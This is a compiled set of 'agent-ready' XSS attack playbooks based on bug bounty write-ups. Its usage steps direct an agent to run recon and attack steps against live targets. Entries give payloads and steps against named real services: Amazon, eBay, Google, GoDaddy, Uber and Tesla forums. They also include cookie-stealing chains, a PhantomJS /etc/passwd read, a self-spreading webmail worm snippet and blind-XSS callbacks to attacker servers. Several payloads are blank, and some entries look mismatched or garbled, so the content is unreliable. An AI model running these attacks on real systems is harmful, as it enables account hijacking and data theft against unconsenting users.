description: Agent-ready bug bounty playbooks from Awesome-Bugbounty-Writeups. Each entry is a self-contained attack playbook.

usage.step_1: Load tactic_index_github.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Amazon Packaging feedback XSS

trigger_conditions.when_to_apply: When an authenticated user can submit feedback related to packaging, and this feedback is reflected in the application without proper sanitization.
prerequisites: An Amazon account and the ability to log in.
applicability_signals: Presence of a feedback form for packaging.
skip_if: Feedback is properly sanitized and no user-controlled input is rendered unsanitized.

recon_steps: Navigate to an Amazon order and look for a packaging feedback option.
Identify the input fields within the packaging feedback form.
attack_steps: Step 1: Submit a packaging feedback entry with a simple XSS payload like `<script>alert(1)</script>` in one of the text fields.
Step 2: Observe if the script executes when viewing the feedback (either by yourself or another user).
tools_recommended: Browser Developer Tools: To inspect form fields and response payloads.
success_indicators: JavaScript `alert(1)` box appears when the feedback is displayed.
failure_indicators: The payload is displayed as plain text or sanitized (e.g., `<script>alert(1)</script>` becomes `<script>alert(1)</script>`). The script does not execute.

playbooks.impact: Execution of arbitrary JavaScript in the context of users viewing the packaging feedback, potentially leading to session hijacking, data theft, or defacement.
playbooks.key_lesson: Always test user-controlled input fields in feedback forms for XSS vulnerabilities by submitting common XSS payloads and observing their rendering.

meta.title: PaypalTech XSS

applicability_signals: Domain www.paypaltech.com identified as providing PayPal IPN scripts and samples.

Analyze the identified domain for potential input vectors that are reflected in the response without proper sanitization.

tools_recommended: insufficient detail in writeup
success_indicators: insufficient detail in writeup
failure_indicators: insufficient detail in writeup

playbooks.impact: Executing arbitrary JavaScript in the context of the victim's browser, potentially leading to session hijacking, data theft, or redirection to malicious sites.
playbooks.key_lesson: Always test domains that provide scripts, samples, or technical documentation for potential cross-site scripting vulnerabilities as they are often overlooked.

meta.title: Persistent XSS on myworld.ebay.com

affected_components: My World section profile text blocks

trigger_conditions.when_to_apply: When the target allows users to input arbitrary text into profile sections and filters HTML tags in a blacklisted manner, allowing deprecated or non-standard tags to pass.
prerequisites: Authenticated user account on eBay.
applicability_signals: Input fields in profile sections that claim to disallow HTML but are susceptible to specific tag bypasses.
Filtering of standard HTML tags like <script>, <a>, <span>.
Lack of output encoding for user-provided HTML content.
skip_if: WAF or input sanitization that strictly enforces an allowlist of HTML tags.
All user input is properly HTML-entity encoded on output.

recon_steps: Step 1: Navigate to the 'My World' section on eBay to access user profile customization.
Step 2: Attempt to inject various HTML tags (<script>, <a>, <span>, etc.) into the text input fields to observe filtering behavior.
Step 3: Test non-standard or deprecated HTML tags (e.g., <plaintext>, <fn>, <credit>) to identify bypasses.
Step 4: Once a bypass tag is found, attempt to inject event handlers like 'onmouseover' or 'onerror'.
attack_steps: Step 1: Inject a deprecated or non-standard HTML tag with an event handler, e.g., <fn onmouseover='alert(1)'>.
Step 2: If the tag and event handler are rendered, attempt to use String.fromCharCode and eval to construct a payload that can execute JavaScript, due to character limits.
Step 3: Craft a payload to steal user credentials or perform actions, leveraging the absence of CSRF protection on the bio update form.
Step 4: Construct a form post to the bio page using the logged-in user's username (e.g., from #gh_uh) to add the attacker to their bio.
Step 5: Exploit the lack of HTTPOnly flag on *.ebay.com cookies to steal session cookies.
payloads_or_patterns: Constructed form post to bio page to self-add
JavaScript payload to steal cookies from document.cookie
tools_recommended: Burp Suite: Intercept and modify requests to test different HTML tags and payloads.
Browser Developer Tools: Inspect HTML structure and JavaScript execution.
success_indicators: JavaScript alert box pops up when hovering over the injected element.
Successful addition to another user's bio without their explicit action.
Attacker's cookie data being sent to a controlled server.
failure_indicators: Input is stripped or rendered as plain text (e.g., <fn> displayed literally). Suggestion: try other non-standard tags or different event handlers.
Event handler is escaped or not executed. Suggestion: verify if JavaScript execution is possible at all, then focus on payload construction.

playbooks.impact: Allows an attacker to execute arbitrary JavaScript in the context of other users visiting the profile, leading to potential session hijacking, data theft, and unauthorized actions (like self-adding to bios).
playbooks.key_lesson: When encountering HTML input filters, test for non-standard/deprecated tags and leverage JavaScript's String.fromCharCode and eval for obfuscation and execution, especially when character limits are a concern.

meta.title: XSS in device management

tech_stack_fingerprints: Google Accounts sign-in page HTML content

trigger_conditions.when_to_apply: When the sign-in page does not properly sanitize user input in parameters that are reflected in the page content.
applicability_signals: Presence of input parameters in the sign-in URL that are reflected in the HTML content.
skip_if: Input parameters are properly sanitized and do not reflect unsafely in the HTML.

recon_steps: Analyze the HTML source of the Google Accounts sign-in page for any reflected parameters.
Identify input parameters in the URL that might be reflected in the page content.
attack_steps: Step 1: Craft a URL with a suspected input parameter and an XSS payload, e.g., https://accounts.google.com/signin/v2/identifier?flowName=GlifWebLoginFlow&continue=https%3A%2F%2Fmyaccount.google.com%2F&ifkv=AVQV9JtJ7A5C3c1r4f2D7H8w9j6k3X5Y0Z1&xsrfs=<script>alert('XSS')</script>
Step 2: Navigate to the crafted URL in a web browser.
Step 3: Observe if the JavaScript payload is executed.
tools_recommended: Browser Developer Tools: Inspect DOM and network requests.
Manual Testing: Crafting and visiting malicious URLs.
success_indicators: An alert box with the message 'XSS' pops up.
The injected JavaScript is executed in the browser's context.
failure_indicators: No alert box appears, and the payload is not executed (e.g., it's escaped or filtered). → Try different XSS payloads and encoding techniques. Check other reflected parameters.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session on the Google Accounts sign-in page, potentially leading to session hijacking, credential theft, or further account compromise.
playbooks.key_lesson: Always test reflected input parameters on authentication pages for XSS vulnerabilities by injecting simple `alert()` payloads.

meta.title: Google VRP XSS

trigger_conditions.when_to_apply: This vulnerability is applicable to any input field on the Google sign-in page that is reflected unsanitized in the response or DOM.
prerequisites: The target must be the Google sign-in page or a similar authentication flow.
applicability_signals: Presence of input fields on the sign-in page.
Unsanitized reflection of input in the HTML or JavaScript.
skip_if: Input fields are properly sanitized.
A WAF blocks common XSS payloads.

recon_steps: Step 1: Navigate to the Google sign-in page: <TARGET_URL>
Step 2: Use browser developer tools to inspect the HTML and JavaScript for any input fields.
Step 3: Observe how user input is rendered on the page or in subsequent responses.
attack_steps: Step 1: Attempt to inject a simple XSS payload, like `<script>alert(1)</script>`, into an input field (e.g., 'Email or phone').
Step 2: Submit the form and observe the response. Look for the payload to be executed in the browser.
Step 3: If the initial payload fails, try more sophisticated payloads, considering context (HTML, JavaScript string, URL parameter) and potential encoding.
tools_recommended: Burp Suite Repeater: To manually test different payloads against the sign-in form submission.
Browser Developer Tools (Inspect Element, Console): To observe DOM changes and JavaScript execution.
success_indicators: An alert box pops up with '1' (or any other defined message).
The injected script is visible in the rendered HTML source or can be executed via the browser console.
failure_indicators: The payload is displayed as plain text on the page.
The input is HTML-escaped.
A WAF block page is returned (403 Forbidden).

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, leading to session hijacking, credential theft, or performing actions on behalf of the user.
playbooks.key_lesson: Always test input fields on authentication pages for reflected XSS vulnerabilities, as these are high-impact targets.

meta.title: Google VRP Blind XSS

trigger_conditions.when_to_apply: When the target application reflects user-provided input in a non-rendered context, potentially leading to blind XSS if that input is later displayed in an administrative or privileged view.
prerequisites: The attacker must be able to submit input that is reflected in the application's response, even if not immediately visible to the end-user.
applicability_signals: HTML source of the Google sign-in page indicates user input is processed (e.g., 'Email or phone' field).
skip_if: The application strictly sanitizes or encodes all user input, preventing any form of injection.
No administrative interface or privileged view exists where the injected payload could be triggered.

recon_steps: Step 1: Analyze the HTML source of the Google sign-in page to identify any parameters or input fields that might reflect user-provided data.

Step 2: Test various input fields on the sign-in page with simple payloads like `<script>alert(1)</script>` to see if they are reflected in the HTML response, even if not directly rendered on the page.
attack_steps: Step 1: Craft a blind XSS payload that includes a callback to an attacker-controlled server (e.g., using `` tag with `onerror` or `fetch` API). Example: ``

Step 2: Submit this payload in a way that is likely to be logged or reflected in a context accessible by a Google administrator or developer. This often involves finding less obvious input fields or parameters on the page.
Step 3: Monitor the attacker-controlled server for incoming requests, which would indicate the XSS payload has been executed in a privileged context.
tools_recommended: Burp Suite Collaborator or Interactsh: To receive out-of-band callbacks and exfiltrate data.
success_indicators: Receiving an HTTP request on the attacker-controlled server (e.g., Burp Collaborator or Interactsh) originating from a Google domain, containing sensitive information like cookies or user identifiers, confirming the payload execution.
failure_indicators: No callbacks received on the attacker-controlled server after submitting the payload. This could mean the input is sanitized, the payload is not reaching a vulnerable context, or the target environment does not execute such scripts. Suggestion: try different injection points or payload variations.

playbooks.impact: Execution of arbitrary JavaScript in the context of a Google administrator or developer, potentially leading to session hijacking, unauthorized actions, or access to sensitive internal information.
playbooks.key_lesson: Always consider blind XSS when user input is processed by an application, especially if there's a possibility of that input being rendered in a privileged administrative interface. Utilize out-of-band techniques to detect such vulnerabilities.

meta.title: WAZE XSS

tech_stack_fingerprints: Contains 'Sign in - Google Accounts' in HTML title

trigger_conditions.when_to_apply: When a user-facing input field on a sign-in or account management page directly reflects user input without proper sanitization, allowing for script injection.
prerequisites: The target page must be a sign-in or account management page that accepts user input.
User input must be reflected in the HTML response.
applicability_signals: Presence of input fields like 'Email or phone'
URL contains '/ServiceLogin?'
skip_if: Input is properly HTML-encoded in the response.
WAF blocks common XSS payloads.

recon_steps: Navigate to the Google Account sign-in page and observe the HTML source for any reflection of input parameters.
Identify input fields and their corresponding HTML elements to understand how data is processed.
attack_steps: Step 1: Attempt to inject a simple XSS payload into the 'Email or phone' input field, such as `<script>alert(1)</script>`.
Step 2: Submit the form and observe the resulting page for any script execution (e.g., an alert box).
Step 3: If the simple payload fails, try URL-encoded payloads or payloads targeting specific HTML attributes.
tools_recommended: Burp Suite: Use the Repeater to test various payloads against the input parameter.
success_indicators: An alert box appears with the domain name of the target.
JavaScript execution is observed in the browser's developer console.
failure_indicators: Input is displayed as plain text or is encoded.
A WAF block page is returned.
No script execution occurs.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session on the Google Accounts domain, potentially leading to session hijacking, data theft, or further phishing attacks.
playbooks.key_lesson: Always test user-controlled input fields on authentication and account management pages for reflected XSS vulnerabilities, paying close attention to how input is rendered in the HTML response.

meta.title: How we invented the Tesla DOM DOOM XSS

affected_components: forums.tesla.com, specifically the 'Insert HTML' button functionality

trigger_conditions.when_to_apply: When a web application uses CKEditor and allows users to insert arbitrary HTML content into a rich text editor, especially if the content is not properly sanitized before rendering.
prerequisites: User must be logged into forums.tesla.com
The 'Insert HTML' button functionality must be accessible to the user.
applicability_signals: The presence of CKEditor instance named 'editor1'.
An element with the ID 'htmlArea' exists for input.
The `editor.insertHtml(value)` function is called with user-provided input without sufficient sanitization.
skip_if: The `insertHtml` function has robust client-side or server-side sanitization that effectively blocks all XSS payloads.
The application is not using CKEditor or a similar rich text editor with an HTML insertion feature.

recon_steps: Navigate to forums.tesla.com and identify the rich text editor.
Inspect the HTML source of the page to confirm the use of CKEditor and identify the 'Insert HTML' button and its associated input field ('htmlArea').
Examine the JavaScript functions associated with the 'Insert HTML' button to understand how user input is processed, specifically looking for calls to `editor.insertHtml()`.
attack_steps: Step 1: Craft a DOM XSS payload that leverages the `insertHtml` function. A basic proof-of-concept is ``.
Step 2: Access the vulnerable page on forums.tesla.com.
Step 3: Paste the crafted payload into the text field associated with the 'Insert HTML' button.
Step 4: Click the 'Insert HTML' button.
Step 5: If the `alert(document.domain)` executes, the DOM XSS is confirmed. For a more advanced attack, append JavaScript to load an external exploit script and redirect the page.
tools_recommended: Browser Developer Tools: For inspecting HTML, JavaScript, and observing execution.
Burp Suite: To intercept requests and responses, though for this self-XSS, it's less critical than for other types.
success_indicators: The execution of `alert(document.domain)` confirming JavaScript execution in the context of the target domain.
A script being loaded and executed from an external source (e.g., doom.example.com or doom.fredrik-almroth.se) which replaces the page content or performs other actions.
failure_indicators: No JavaScript alert box appears, and the input is rendered as plain text or escaped HTML.
A WAF blocks the payload or the HTML insertion fails with an error. This might indicate the need for more advanced bypass techniques for CKEditor's `unfiltered_html` mode.

playbooks.impact: Allows an attacker to execute arbitrary JavaScript in the context of the victim's browser session on forums.tesla.com. This could lead to session hijacking, phishing, data theft, or redirection to malicious sites.
playbooks.key_lesson: Always scrutinize rich text editor implementations, especially their HTML insertion features, for DOM XSS vulnerabilities as they often involve insecure processing of user-provided HTML.

meta.title: Escalating XSS in phantomjs image rendering to SSRF

trigger_conditions.when_to_apply: When the application uses PhantomJS to render HTML input from user-controlled parameters into an image and basic JavaScript execution for XSS is unreliable.
prerequisites: The application must be rendering user-provided input into an image using PhantomJS.
The 'header' parameter must be vulnerable to HTML injection.
applicability_signals: The '/download' endpoint exists and accepts parameters like 'background', 'author', 'header'.
User input in the 'header' parameter is reflected in the rendered image.
PhantomJS is identified in the User-Agent header of the request made to the attacker's server when an iframe is used.
skip_if: JavaScript execution is consistently blocked or does not trigger.
Server returns a 403 Forbidden for any attempts to load external resources or local files.

recon_steps: Step 1: Send a request to the /download endpoint with various HTML tags in the 'header' parameter (e.g., ,
Step 2: Analyze the HTTP request to your own server (e.g., xss.buer.haus) to identify the User-Agent string. If it contains 'PhantomJS', confirm the technology stack.
Step 3: Test basic XSS payloads like `` or `` to check for consistent JavaScript execution. Observe any server errors.
attack_steps: Step 1: If basic JavaScript is inconsistent, use `document.write` to overwrite page content and ensure consistent JS execution. Example: https://<TARGET_URL>/download?background=file.jpg&author=Brett&header=<img src="x" onerror="document.write('test')" />&text=&width=500&height=500

Step 2: Confirm the execution origin and path by injecting `document.write(window.location)` into the header. Example: https://<TARGET_URL>/download?background=file.jpg&author=Brett&header=<img src="x" onerror="document.write(window.location)" />&text=&width=500&height=500

Step 3: Attempt to load local files using an iframe with `file:///` URIs. Start with a known path like `/var/task/` and then attempt sensitive files like `/etc/passwd`. Example for /etc/passwd: https://<TARGET_URL>/download?background=file.jpg&author=Brett&header=<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>&text=&width=500&height=500
payloads_or_patterns: HTML injection for consistent JS execution: ``
Exploiting file access via iframe: ``
SSRF attempt via iframe: ``
tools_recommended: Burp Suite: To capture and modify requests, and to host a listener for SSRF callbacks.
A custom server or service for receiving HTTP requests and logging User-Agents.
success_indicators: Observed content of local files (e.g., /etc/passwd) within the rendered image or an error message indicating the file could not be loaded.
A callback request to a listener (e.g., Burp Collaborator) when attempting to access external URLs via an iframe.
failure_indicators: Application returns generic error messages (e.g., 'Internal server error') for all attempts to load local files or external URLs. This might indicate a WAF or strict sanitization. Suggestion: Try different file paths or alternative SSRF vectors.
No observed JavaScript execution or rendering of HTML tags. This might mean the input is heavily sanitized. Suggestion: Explore other parameters for injection.

playbooks.impact: Arbitrary local file read on the server, potentially exposing sensitive configuration files, credentials, or application source code. Could also lead to Server-Side Request Forgery (SSRF) by forcing the server to make requests to internal or external resources.
playbooks.key_lesson: When an application uses a headless browser like PhantomJS for rendering, test for reliable JavaScript execution using techniques like `document.write` before attempting complex XSS payloads, and explore local file access with `file:///` URIs.

meta.title: Reflected XSS in Simplerisk

trigger_conditions.when_to_apply: This technique is applicable when the target application has a password reset form where the 'user' field is used to identify the user and is not properly sanitized before being reflected in the response.
prerequisites: The target must have a user password reset functionality.
applicability_signals: The target application has a 'reset.php' endpoint.
The password reset form includes a 'user' input field.
skip_if: If the 'user' field is properly escaped or filtered, preventing JavaScript execution.

recon_steps: Step 1: Identify the password reset functionality of the target application, typically found by navigating to '/reset.php' or searching for 'forgot password'.
Step 2: Examine the HTML source of the password reset form to identify the input parameters, specifically looking for a parameter named 'user'.
attack_steps: Step 1: Send a POST request to '/reset.php' with a crafted payload in the 'user' parameter. The payload should include HTML tags that can execute JavaScript, such as '<script>'.
Step 2: Observe the response to the POST request. If the payload is reflected in the HTML without proper sanitization, the injected JavaScript will execute in the user's browser context.
Step 3: If JavaScript execution is confirmed (e.g., an alert box appears), further actions can be taken, such as stealing session cookies or performing actions on behalf of the user.
payloads_or_patterns:
POST /simplerisk/reset.php HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded

user='”–> </style></script><script> alert(document.domain) </script> &token=&password= &repeat_password= &password_reset=
tools_recommended: Burp Suite: Capture and modify the password reset request, then send it to Repeater to test different payloads.
success_indicators: An alert box displaying the current domain is shown in the browser. This confirms that the JavaScript payload has been successfully executed within the application's context.
The injected script appears in the response HTML without being escaped or rendered as plain text.
failure_indicators: The response shows the payload as plain text or HTML entities, indicating it was not executed. Pivot: Try different XSS payloads or investigate other input fields.
A WAF blocks the request with a 403 Forbidden response. Pivot: Use encoded payloads or try obfuscation techniques.

playbooks.impact: An attacker can steal SimpleRisk users' session cookies, perform actions on behalf of users, and hijack session cookies, leading to unauthorized access and potential compromise of the risk management data.
playbooks.key_lesson: Always test input fields in forms, especially those related to user identification or recovery, for reflected Cross-Site Scripting vulnerabilities by injecting JavaScript payloads.

meta.title: Stored XSS in the heart of the russian email provider

trigger_conditions.when_to_apply: When the email provider parses .eml files and reflects the 'subject' field without proper sanitization.
prerequisites: The attacker must be able to send an email to a victim.
applicability_signals: The target application parses .eml files.
The 'subject' field from an .eml file is reflected in the UI without sanitization.
skip_if: If the subject field is properly sanitized or encoded before display.

recon_steps: Step 1: Identify the email provider's functionality for handling .eml files.
Step 2: Analyze how the 'subject' field from an .eml file is processed and displayed to the recipient.
attack_steps: Step 1: Create a new .eml file with a malicious script in the subject field.
Step 2: Upload this .eml file through the web interface (specifically m.mail.ru as per the writeup).
Step 3: Send the crafted email to a victim.
Step 4: Have the victim open the received email.
tools_recommended: Text editor for creating .eml files
Mail.ru web client for sending emails
success_indicators: The JavaScript alert box appears when the victim opens the email.
failure_indicators: The script tags are displayed as plain text or are encoded, preventing execution. The alert box does not appear.
If failure, investigate encoding or sanitization bypass techniques.

playbooks.impact: Execution of arbitrary JavaScript in the victim's browser, leading to session hijacking, data theft, or further malicious actions on behalf of the user. Potential for an XSS worm if the script can automate sending the malicious email to the victim's contacts.
playbooks.key_lesson: Always sanitize and encode user-supplied input, especially when it's reflected in the user interface, to prevent XSS vulnerabilities. Pay close attention to file parsing and how metadata from files is handled.

meta.title: How I built an XSS worm on atmail

trigger_conditions.when_to_apply: When the email client allows rich text formatting and rendering of HTML content within the compose window or in the preview pane. The vulnerability requires the ability to send emails to other users within the same atmail instance.
prerequisites: Attacker must have an authenticated account within the target atmail instance.
Target must have other users within the same atmail instance who can receive emails from the attacker.
applicability_signals: Ability to compose emails with HTML content, including scripting tags. Observe the editor's behavior when pasting or typing JavaScript. Look for the presence of rich text formatting options that might allow HTML injection.
skip_if: The email client sanitizes all script tags and HTML attributes, preventing any code execution. Responses indicate a Content Security Policy (CSP) that effectively blocks inline scripts and event handlers.

recon_steps: Step 1: Log in to the atmail webmail client as an authenticated user.
Step 2: Navigate to the compose email functionality.
Step 3: Attempt to paste or inject simple HTML tags like `test` or `test` to confirm if HTML is rendered.
Step 4: Try injecting a basic JavaScript payload, such as `<script>alert(1)</script>`, within the email body or subject to check for XSS filtering.
attack_steps: Step 1: Compose a new email. In the email body, include a script tag with the payload designed to spread the worm. A common approach is to use `` tags with `onerror` events or `

Step 2: The payload should be designed to trigger when the recipient opens or previews the email. For a worm, the payload needs to access the sender's cookies or session tokens and then use them to send a new email containing the same malicious script to other contacts or recipients in the address book.

Step 3: Craft a payload that, upon execution, iterates through the recipient's contact list or address book. For each contact, it constructs and sends a new email using the atmail client's API or UI, embedding the same XSS payload.
Step 4: Send the crafted email to a target user within the atmail instance. Monitor the controlled server for incoming requests from the payload, confirming execution.
payloads_or_patterns: var contacts = atmail.getContacts(); for(var i=0; i<contacts.length; i++) { atmail.sendEmail(contacts[i], 'FWD: Read this!', '<script>alert(\'wormed\')</script>'); }
tools_recommended: Burp Suite: To intercept and modify outgoing emails, analyze network traffic, and host the attacker-controlled server for logging executed payloads.
Custom script: To automate the process of generating payloads and managing the attacker-controlled logging server.
success_indicators: The payload executes in the recipient's browser when they view the email. Specifically for a worm, observing incoming requests on the attacker-controlled server originating from the victim's atmail session, indicating successful exfiltration of cookies or execution of spreading actions.
Witnessing new emails being sent out from compromised accounts to other users within the atmail instance, containing the malicious payload.
failure_indicators: The script tags or event handlers are stripped out by the email client's sanitization. Responses show empty or malformed HTML. Consider alternative XSS vectors like DOM-based XSS if available.
The email client executes JavaScript but cannot access the necessary APIs to read contacts or send emails, indicating client-side limitations. Pivot to other vulnerabilities if present.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session within the atmail webmail client. This can lead to session hijacking, exfiltration of sensitive user data (emails, contacts, personal information), and the ability to perform actions on behalf of the user, such as sending emails, deleting messages, or modifying settings. The worm functionality allows for rapid propagation and compromise of multiple accounts within the atmail instance.
playbooks.key_lesson: Always test rich text editing functionalities in web applications for cross-site scripting vulnerabilities, paying close attention to how HTML and JavaScript are rendered and sanitized, especially in features that interact with other users like email clients.

meta.title: Godaddy XSS affects parked domains redirector Processor

trigger_conditions.when_to_apply: When the target hosts a parked domain redirector/processor, as evidenced by the presence of the 'mcc.godaddy.com/park/' endpoint.
applicability_signals: The endpoint '/park/[PARKED_DOMAIN]' is accessible on mcc.godaddy.com.
skip_if: The '/park/' endpoint returns an unexpected status code (e.g., 404, 403) or does not appear to handle URL parameters for parked domains.

recon_steps: Access mcc.godaddy.com to confirm its functionality.
Identify if the '/park/' endpoint exists and accepts parameters related to parked domains.
attack_steps: Send a GET request to http://mcc.godaddy.com/park/[PARKED_DOMAIN]?72565%27%3balert(document.domain)%2f%2f146=1, replacing '[PARKED_DOMAIN]' with a valid or seemingly valid parked domain identifier.
Observe the response for JavaScript execution, specifically an alert box showing the domain.
tools_recommended: Burp Suite: To intercept and modify the GET request.
success_indicators: An alert box pops up displaying 'mcc.godaddy.com'.
The injected JavaScript `alert(document.domain)` executes successfully.
failure_indicators: No alert box is displayed, indicating the payload was not executed or sanitized. In this case, investigate if the parameter is encoded or if a different injection point exists.
A 403 Forbidden or other error response indicates potential WAF blocking or improper access.

playbooks.impact: Cookie theft, phishing attacks, session hijacking, and other malicious activities enabled by arbitrary JavaScript execution in the context of the GoDaddy domain.
playbooks.key_lesson: Always test URL parameters for XSS, especially those handling user-provided identifiers or redirects, as they can be vectors for script injection even in seemingly functional endpoints.

meta.title: Stored XSS in Google image search

tech_stack_fingerprints: Google login page elements (e.g., 'Sign in - Google Accounts', 'Email or phone')

trigger_conditions.when_to_apply: When an authenticated user can input data into the image search that is later displayed to other users without proper sanitization.
prerequisites: Attacker must have a Google account and be logged in.
applicability_signals: Observable user input in the image search functionality that is reflected in subsequent searches or results pages.
skip_if: All user inputs in the image search are strictly sanitized, preventing any HTML or script execution.

recon_steps: Step 1: Navigate to Google's image search interface while logged in.
Step 2: Observe how search queries are processed and displayed. Look for any user-supplied data that is rendered as HTML or without proper escaping.
attack_steps: Step 1: Perform an image search with a carefully crafted XSS payload in the search query. For example, search for `<script>alert(document.domain)</script>`.

Step 2: Observe if the search query or any related displayed information (like 'Searches related to...') renders the injected script. If it does, attempt to save or share the search if such functionality exists, to achieve persistence.

Step 3: If the payload is reflected directly in the current session, it's reflected XSS. To achieve stored XSS, the payload must be present in a context that is stored and later delivered to other users (e.g., via 'related searches', 'trending searches', or if search queries are somehow saved and displayed).
tools_recommended: Burp Suite: To intercept and modify search queries, and to observe detailed HTTP responses.
success_indicators: Execution of the injected JavaScript code (e.g., an alert box appears with the domain name), and confirmation that this injected code persists and is delivered to other users without needing the attacker's direct session.
failure_indicators: The search query is displayed literally without executing any script (e.g., '<script>alert(document.domain)</script>' is shown as text). This indicates output encoding or sanitization. Consider trying different XSS payloads or testing other input fields.
The search results page does not reflect the injected payload in any observable way, suggesting the input is discarded or heavily processed.

playbooks.impact: Execution of arbitrary JavaScript in the context of other users' Google sessions, leading to potential session hijacking, data theft (e.g., cookies, account information displayed on the page), or defacement of Google search interfaces.
playbooks.key_lesson: Always test user-supplied input in search functionalities for stored XSS by injecting script tags and observing if they are rendered and executed in subsequent user sessions.

meta.title: Penetrating Pornhub XSS vulns

trigger_conditions.when_to_apply: When the target application reflects user-supplied input in a way that can be controlled by an attacker, particularly in URL parameters or form inputs. This is especially true if the input is not properly sanitized.
prerequisites: The target website must have functionality that accepts user input and reflects it back into the HTML response without proper sanitization.
applicability_signals: Existence of a "redeem code" section with a text input.
URL parameters that change based on user interaction, such as `&compliancePop=no_gateway`.
skip_if: Input is strictly validated against an allowlist or denylist before reflection.
All user-supplied input is properly HTML-encoded before being rendered.

recon_steps: Step 1: Navigate to the PornHub Premium website and identify interactive sections like "redeem code" or areas where user input is taken.
Step 2: Observe URL parameters after user interactions, such as clicking buttons or submitting forms, to identify potential injection points.
attack_steps: Step 1: Access the "redeem code" section and submit a crafted payload in the text input. The payload is `PAYLOAD+STACK++%3E%27" /Autof<K>ocus /O<K>nfocus=confirm`1`//&error=1`. The `PAYLOAD+STACK` prefix is used to bypass an initial validator.

Step 2: Navigate to the page where the "enter" button is presented after the age/compliance pop-up. Modify the URL from `&compliancePop=no_gateway` to `&compliancePop=no_gateway"-confirm`1`-"` to inject the XSS payload.
Step 3: Observe the browser's response for evidence of script execution.
tools_recommended: Burp Suite: To capture and modify HTTP requests, especially for testing URL parameters.
Browser Developer Tools: To inspect HTML responses and JavaScript console for errors or successful script execution.
success_indicators: An alert box with the value '1' appearing on the page, indicating successful execution of `confirm`1``.
The injected script (`confirm`1``) is executed by the browser.
failure_indicators: No alert box appears and the input is reflected as plain text or is encoded.
A server-side error or validation message is displayed, indicating the payload was blocked.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session on PornHub Premium. This could lead to session hijacking (stealing cookies/session tokens), data theft, unauthorized actions on behalf of the user, or redirection to malicious sites.
playbooks.key_lesson: Always test user input reflection points, especially in URL parameters and form fields, for XSS vulnerabilities. Consider how initial validation might be bypassed before injecting the main payload.

meta.title: Turning Self-XSS into Good XSS v2

trigger_conditions.when_to_apply: When a Self-XSS vulnerability is found on a subdomain and an arbitrary cookie installation vulnerability can be chained to it on a parent domain.
prerequisites: Self-XSS vulnerability on m.uber.com
Arbitrary cookie installation vulnerability on business.uber.com scoped to *.uber.com
applicability_signals: User profile modification via mobile app
Business subdomain accepting user input for cookie headers
skip_if: Self-XSS is patched
Arbitrary cookie installation is patched or not applicable to *.uber.com

recon_steps: Identify Self-XSS on m.uber.com by modifying profile name via mobile app.
Test business.uber.com for arbitrary cookie installation by injecting cookie values into the domain parameter of requests to /new/confirm/[exploit-here].
attack_steps: Step 1: Create a malicious link that first performs the arbitrary cookie installation on business.uber.com by setting a 'token' cookie for the *.uber.com domain.
Step 2: Redirect the victim to m.uber.com, triggering the Self-XSS. The Self-XSS payload should then attempt to steal the 'oauth2' cookie scoped to *.uber.com.
Step 3: If successful, the attacker will have obtained the victim's 'oauth2' cookie, allowing them to impersonate the user on any *.uber.com subdomain.
payloads_or_patterns:
<script>
var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET', 'https://business.uber.com/new/confirm/test;,token= XXXXXXXXXXXXXXX ;domain=.uber.com', false); // insert your token here
xmlhttp.send(null);
</script>
<script>
function exploit() {
  setTimeout(function() {
    var s1 = new XMLHttpRequest();
    s1.open('GET', 'https://m.uber.com/', false);
    s1.send(null);
    document.location.href = 'https://m.uber.com/'; // now redirecting to page
  }, 3000);
}
</script>
<body onload='exploit()'>
tools_recommended: Burp Suite: To intercept and modify requests to business.uber.com for testing arbitrary cookie installation.
Custom script: To chain the two vulnerabilities for proof-of-concept.
success_indicators: The attacker receives the victim's 'oauth2' cookie via a network request to their controlled server.
The attacker can successfully authenticate as the victim on m.uber.com or other *.uber.com subdomains using the stolen cookie.
failure_indicators: No 'oauth2' cookie is received by the attacker.
The Self-XSS payload fails to execute or cannot steal the cookie.
The arbitrary cookie installation fails to set the cookie for *.uber.com.

playbooks.impact: Stealing the 'oauth2' cookie allows an attacker to impersonate any logged-in Uber user, gaining access to their account, personal information, and potentially performing actions on their behalf (e.g., booking rides, accessing payment information).
playbooks.key_lesson: Always investigate the possibility of chaining multiple vulnerabilities, especially when a Self-XSS can be combined with a broader impact vulnerability like arbitrary cookie installation.

meta.title: Runkeeper stored XSS

trigger_conditions.when_to_apply: When the target application allows unsanitized user input in the profile name field, which is then reflected on a public profile page.
prerequisites: Ability to create or edit a RunKeeper user profile.
applicability_signals: User profile name field accepts special characters and script tags.
Public user profile page displays the entered name without proper encoding.
skip_if: Profile name input is strictly sanitized or encoded.
Public user profile page does not render the user-provided name.

recon_steps: Navigate to the user profile editing section of RunKeeper.
Inspect the input field for the user's profile name for any obvious validation or sanitization.
attack_steps: Step 1: Craft a malicious JavaScript payload, e.g., `<script>alert(document.domain)</script>`.
Step 2: Submit the crafted payload as the RunKeeper user profile name.
Step 3: Navigate to a public view of the compromised user's profile page.
Step 4: Observe if the JavaScript payload is executed in the browser.

failure_indicators: The payload is displayed as plain text or is stripped out, indicating sanitization.
The profile page does not load or shows an error.

playbooks.key_lesson: Always properly sanitize and encode user-supplied input that is displayed in web application output, especially in publicly accessible pages, to prevent Stored XSS.

meta.title: Poisoning the well compromising godaddy customer support with blind XSS

affected_components: User Profile (First Name, Last Name fields)
tech_stack_fingerprints: Response contains 'GoDaddy' in HTML or headers

trigger_conditions.when_to_apply: When user profile fields like first name or last name are vulnerable to XSS and the data is reflected in an administrative or customer support panel.
prerequisites: Ability to modify user profile information (e.g., first name, last name).
applicability_signals: User profile fields accept script tags and special characters.
An administrative or customer support panel displays user information.
